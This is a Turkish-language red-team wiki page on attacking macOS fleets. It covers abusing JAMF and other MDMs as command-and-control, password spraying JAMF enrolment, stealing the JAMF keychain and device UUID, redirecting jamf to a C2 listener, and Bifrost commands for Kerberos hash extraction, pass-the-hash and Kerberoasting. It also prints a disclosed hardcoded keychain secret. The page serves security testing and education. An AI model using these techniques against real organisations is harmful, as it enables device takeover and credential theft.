# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## MDM'leri Kötüye Kullanma

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Yönetim platformuna erişmek için **admin kimlik bilgilerini ele geçirebilirseniz**, makinelerde malware dağıtarak **potansiyel olarak tüm bilgisayarları ele geçirebilirsiniz**.

MacOS ortamlarında Red Teaming için MDM'lerin nasıl çalıştığı hakkında bilgi sahibi olmanız önemle tavsiye edilir:


{{#ref}}
macos-mdm/
{{#endref}}

### MDM'yi C2 Olarak Kullanma

Bir MDM'nin profilleri yükleme, sorgulama veya kaldırma, uygulama yükleme, yerel admin hesapları oluşturma, firmware parolası belirleme, FileVault anahtarını değiştirme gibi izinleri olur...

Kendi MDM'nizi çalıştırmak için **CSR'nizin bir sağlayıcı tarafından imzalanması gerekir**; bunu [**https://mdmcert.download/**](https://mdmcert.download/) üzerinden edinmeyi deneyebilirsiniz. Apple cihazları için kendi MDM'nizi çalıştırmak üzere [**MicroMDM**](https://github.com/micromdm/micromdm) kullanabilirsiniz.

MDM kaydı, yönetim sunucusunun TLS sertifikasını otomatik olarak güvenilir bir CA yapmaz veya bir uygulama imzalama kimliği sağlamaz. Sunucu özel bir CA kullanıyorsa, kök ve ara sertifikaları kayıt profiline ya da ayrı bir güven profiline eklemek gerekir. MDM kimlik doğrulaması için kullanılan istemci kimliği farklı bir sertifikadır.<sup>[[7]](#references)</sup>

İndirilmiş bir MDM kayıt profili (`.mobileconfig`) açılmalı ve **Sistem Ayarları → Genel → Aygıt Yönetimi** bölümünden onaylanmalıdır. Profili root yetkisiyle yüklenen bir `.pkg` içine koymak veya Safari'de açılan bir ZIP dosyasına eklemek, güncel bir Mac'i sessizce kaydetmez. Bkz. [configuration profile behavior](../macos-auto-start-locations.md#configuration-profiles-mobileconfig).<sup>[[8]](#references)</sup>

Setup Assistant sırasında yapılan Automated Device Enrollment ayrı bir akıştır. Farklı önkoşulları için bkz. [rogue enrollment of another organization's device](macos-mdm/enrolling-devices-in-other-organisations.md).<sup>[[9]](#references)</sup>

**Mythic agent Orthrus** bu tekniği kullanır.

### Yönetiminizdeki bir MDM üzerinden paket dağıtma

**macOS 26 veya sonraki sürümleri çalıştıran, denetimli bir Mac'te**, MDM hizmetinin kontrolü sistem kapsamındaki bir `com.apple.configuration.package` bildiriminin kullanılmasına olanak tanır.<sup>[[10]](#references)</sup> Paketin, aygıtın doğrulayabileceği bir imzası olmalıdır; ancak uygulamasının ayrı bir Developer ID imzasına sahip olması gerekmez: Gatekeeper, aygıt yönetimi üzerinden yüklenen uygulamaları denetlemez.<sup>[[11]](#references)</sup> Güvenilir bir sunucu TLS sertifikası tek başına, operatöre paket imzası için gereken özel anahtarı veya imzalama kullanım yetkisini vermez.<sup>[[11]](#references)[[12]](#references)</sup>

İmzalı bir test paketi oluşturun, özetini hesaplayın ve paketi `ManifestURL` plist'iyle birlikte HTTPS üzerinden yayımlayın. Manifestte URL'si ve SHA-256 değeri bulunan bir `software-package` öğesinin yanı sıra benzersiz bir `bundle-identifier` ve `bundle-version` bulunmalıdır.<sup>[[11]](#references)</sup> Ardından bu manifest URL'sini içeren ve `InstallBehavior.Install` değerini `Required` olarak ayarlayan bir paket bildirimi gönderin; yükleme veya hatalar için `package.list` durum öğesini kontrol edin.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
pkgbuild --component ./Test.app --install-location /Applications --sign "Package Signing Certificate" ./Test.pkg
shasum -a 256 ./Test.pkg
```

MDM hizmeti aracılığıyla gönderilen asgari gerekli yükleme bildirimi şöyle görünür (URL'yi ve her iki UUID'yi değiştirin).<sup>[[10]](#references)</sup>

```json
{
  "Type": "com.apple.configuration.package",
  "Identifier": "11111111-1111-4111-8111-111111111111",
  "ServerToken": "22222222-2222-4222-8222-222222222222",
  "Payload": {
    "ManifestURL": "https://mdm.example.org/TestPackage.plist",
    "InstallBehavior": {"Install": "Required"}
  }
}
```

### JAMF PRO'yu Kötüye Kullanma

JAMF **özel script'ler** (sysadmin tarafından geliştirilen script'ler), **yerel payload'lar** (yerel hesap oluşturma, EFI parolası ayarlama, dosya/süreç izleme...) ve **MDM** (cihaz yapılandırmaları, cihaz sertifikaları...) çalıştırabilir.<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

**Self-enrolment** özelliğinin etkin olup olmadığını görmek için `https://<company-name>.jamfcloud.com/enroll/` gibi bir sayfaya gidin. Etkinse **erişim için kimlik bilgileri isteyebilir**.

Parola spraying saldırısı gerçekleştirmek için [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) script'ini kullanabilirsiniz.

Ayrıca, geçerli kimlik bilgilerini bulduktan sonra aşağıdaki formu kullanarak diğer kullanıcı adlarına yönelik brute-force saldırısı gerçekleştirebilirsiniz:

![JAMF PRO'yu Kötüye Kullanma - JAMF self-enrolment: Ayrıca, geçerli kimlik bilgilerini bulduktan sonra aşağıdaki formu kullanarak diğer kullanıcı adlarına yönelik brute-force saldırısı gerçekleştirebilirsiniz](<../../images/image (107).png>)

#### JAMF cihaz kimlik doğrulaması

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binary'si, keychain'i açmak için gereken sırrı içeriyordu. Keşfedildiği sırada bu sır **herkesle paylaşılıyordu** ve değeri şuydu: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Ayrıca jamf, **`/Library/LaunchAgents/com.jamf.management.agent.plist`** konumunda bir **LaunchDaemon** olarak kalıcılık sağlar.

#### JAMF cihazını ele geçirme

**`jamf`** tarafından kullanılacak **JSS** (Jamf Software Server) **URL**'si **`/Library/Preferences/com.jamfsoftware.jamf.plist`** konumunda bulunur.\
Bu dosya temel olarak URL'yi içerir:

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
	<key>is_virtual_machine</key>
	<false/>
	<key>jss_url</key>
	<string>https://subdomain-company.jamfcloud.com/</string>
	<key>last_management_framework_change_id</key>
	<integer>4</integer>
[...]
```

Böylece bir saldırgan, kurulum sırasında **bu dosyanın üzerine yazan** kötü amaçlı bir paket (`pkg`) bırakıp URL'yi Typhon agent'taki bir Mythic C2 listener'ına ayarlayarak JAMF'i C2 olarak kötüye kullanabilir.

```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```

#### JAMF Impersonation

Bir cihaz ile JMF arasındaki **iletişimi taklit etmek** için şunlar gerekir:

- Cihazın **UUID**'si: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- Cihaz sertifikasını içeren **JAMF keychain**: `/Library/Application\ Support/Jamf/JAMF.keychain`

Bu bilgilerle, **çalınan** Hardware **UUID**'sine sahip ve **SIP devre dışı** bir **VM oluşturun**, **JAMF keychain'i** bırakın, Jamf **agent'ını hook edin** ve bilgilerini çalın.

#### Gizli Bilgilerin Çalınması

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ayrıca, yöneticilerin Jamf üzerinden çalıştırmak isteyebileceği **özel script'ler** için `/Library/Application Support/Jamf/tmp/` konumunu izleyebilirsiniz. Bu script'ler **buraya bırakılır, çalıştırılır ve silinir**. Bu script'ler **kimlik bilgileri içerebilir**.

Ancak **kimlik bilgileri** bu script'lere **parametre** olarak da aktarılabilir; bu nedenle `ps aux | grep -i jamf` komutunu izlemeniz gerekir (root olmanız bile gerekmez).

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) script'i, yeni dosyaların eklenmesini ve yeni işlem argümanlarını dinleyebilir.

### macOS Uzaktan Erişim

Ayrıca **MacOS**'un "özel" **ağ** **protokolleri** hakkında:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Bazı durumlarda **MacOS bilgisayarın bir AD'ye bağlı** olduğunu görebilirsiniz. Bu senaryoda, alışık olduğunuz şekilde Active Directory'yi **enumere etmeyi** denemelisiniz. Aşağıdaki sayfalarda **yardım** bulabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Size yardımcı olabilecek bazı **yerel MacOS araçları** arasında `dscl` de bulunur:

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```

Ayrıca AD'yi otomatik olarak numaralandırmak ve Kerberos ile çalışmak için MacOS'a yönelik bazı araçlar da hazırlanmıştır:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound, MacOS ana makinelerinde Active Directory ilişkilerini toplamaya ve içe aktarmaya olanak tanıyan Bloodhound denetim aracının bir uzantısıdır.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost, macOS'ta Heimdal krb5 API'leriyle etkileşim kurmak için tasarlanmış bir Objective-C projesidir. Projenin amacı, hedefte başka bir framework veya paket gerektirmeden yerel API'leri kullanarak macOS cihazlarında Kerberos güvenlik testlerini iyileştirmektir.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory numaralandırması için JavaScript for Automation (JXA) aracı.

### Etki Alanı Bilgileri

```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```

### Kullanıcılar

MacOS kullanıcılarının üç türü vardır:

- **Local Users** — Yerel OpenDirectory hizmeti tarafından yönetilirler ve Active Directory’ye hiçbir şekilde bağlı değildirler.
- **Network Users** — Kimlik doğrulaması için DC sunucusuna bağlanması gereken geçici Active Directory kullanıcılarıdır.
- **Mobile Users** — Kimlik bilgileri ve dosyaları için yerel yedeği bulunan Active Directory kullanıcılarıdır.

Kullanıcılar ve gruplarla ilgili yerel bilgiler _/var/db/dslocal/nodes/Default._ klasöründe saklanır.\
Örneğin, _mark_ adlı kullanıcının bilgileri _/var/db/dslocal/nodes/Default/users/mark.plist_ dosyasında, _admin_ grubunun bilgileri ise _/var/db/dslocal/nodes/Default/groups/admin.plist_ dosyasında saklanır.

HasSession ve AdminTo edge’lerini kullanmaya ek olarak, **MacHound Bloodhound veritabanına üç yeni edge ekler**:<sup>[[2]](#references)</sup>

- **CanSSH** - ana makineye SSH yapmasına izin verilen varlık
- **CanVNC** - ana makineye VNC yapmasına izin verilen varlık
- **CanAE** - ana makinede AppleEvent betiklerini çalıştırmasına izin verilen varlık

```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```

Daha fazla bilgi için [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Computer$ parolası

Parolaları şu komutla alın:

```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```

**`Computer$`** parolasına System keychain içinden erişmek mümkündür.

### Over-Pass-The-Hash

Belirli bir kullanıcı ve hizmet için TGT alın:

```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
       --hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```

TGT toplandıktan sonra, aşağıdaki komutla mevcut oturuma enjekte etmek mümkündür:

```bash
bifrost --action asktgt --username test_lab_admin \
       --hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
       --enctype aes256 --domain test.lab.local
```

### Kerberoasting

```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
       --username [user] --hash [hash] --enctype [enctype]
```

Elde edilen service ticket'larla diğer bilgisayarlardaki paylaşımlara erişmeyi denemek mümkündür:

```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

## Keychain'e Erişim

Keychain büyük olasılıkla, bir istem oluşturulmadan erişildiğinde red team çalışmasının ilerlemesine yardımcı olabilecek hassas bilgiler içerir:


{{#ref}}
macos-keychain.md
{{#endref}}

## Harici Servisler

MacOS Red Teaming, normal Windows Red Teaming'den farklıdır; çünkü **MacOS genellikle doğrudan çeşitli harici platformlarla entegredir**. Yaygın bir MacOS yapılandırmasında bilgisayara **OneLogin ile senkronize edilmiş kimlik bilgileri kullanılarak erişilir ve OneLogin aracılığıyla** github, aws gibi çeşitli harici servislere erişilir.

## Diğer Red Team teknikleri

### Safari

Safari'de bir dosya indirildiğinde, dosya "güvenli" ise **otomatik olarak açılır**. Örneğin, bir **zip indirirseniz** otomatik olarak açılır:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>



## References

- [1] [Apple Toplamaya Gittim: 2021'de MacOS Ortamlarında Red Teaming - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [MacHound'u Tanıtıyoruz: macOS Active Directory Tabanlı Saldırılara Yönelik Bir Çözüm](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Komutları (dscl / net / ldapsearch eşdeğerleri)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Karanlık Tarafa Gelin, Elmalarımız Var: macOS Yönetimini Kötü Amaçlı Hale Getirmek](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "Jamf Yapılandırmalarına Saldırganın Bakış Açısı" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Mac ile Active Directory Keşfi - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
- [7] [Apple — Aygıt yönetimi servisleri ve aygıtlar için sertifikaları yönetme](https://developer.apple.com/documentation/devicemanagement/managing-certificates-for-device-management-services-and-devices)
- [8] [Apple — Mac'te yapılandırma profillerini kullanma](https://support.apple.com/en-gb/guide/mac-help/mh35561/mac)
- [9] [Apple — Aygıt yönetimi kayıt profillerini dağıtma](https://developer.apple.com/documentation/devicemanagement/deploying-device-management-enrollment-profiles)
- [10] [Apple — Paket bildirimi](https://developer.apple.com/documentation/devicemanagement/package)
- [11] [Apple — Paketleri yükleme](https://developer.apple.com/documentation/devicemanagement/installing-packages)
- [12] [Apple — Kimlikler](https://developer.apple.com/documentation/security/identities)
{{#include ../../banners/hacktricks-training.md}}
